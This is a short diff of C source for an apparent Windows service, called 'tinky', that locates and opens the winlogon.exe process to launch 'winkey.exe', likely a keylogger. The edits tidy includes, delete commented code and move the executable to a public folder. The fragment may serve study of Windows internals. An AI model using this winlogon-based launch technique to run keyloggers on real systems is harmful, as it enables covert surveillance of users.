@@ -1,10 +1,5 @@
-#pragma warning(push)
-#pragma warning(disable:4668 4577)
-#include <windows.h>
-#include <iostream>
 #include "tinky.h"
-#include <Tlhelp32.h>
-#pragma warning(pop)
+
 
 
 SC_HANDLE               scmH;
@@ -160,11 +155,6 @@ int main(int argc, CHAR **argv)
         CloseServiceHandle(serviceH);
     }
     else {
-        /*SERVICE_TABLE_ENTRY ServiceStartTable[] =
-        {
-            {SVCNAME, (LPSERVICE_MAIN_FUNCTIONA)ServiceMain },
-            {NULL, NULL}
-        };*/
         SERVICE_TABLE_ENTRY ServiceStartTable[2];
         ServiceStartTable[0].lpServiceName = SVCNAME;
         ServiceStartTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
@@ -203,7 +193,7 @@ void    Tinky_Winky() {
     DWORD winlogonPID;
     HANDLE wlPH;
     HANDLE wlTH;
-    LPWSTR PP = L"c:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
+    LPWSTR PP = L"C:\\Users\\Public\\winkey.exe";
 
     winlogonPID = GetPidByName("winlogon.exe");
     wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
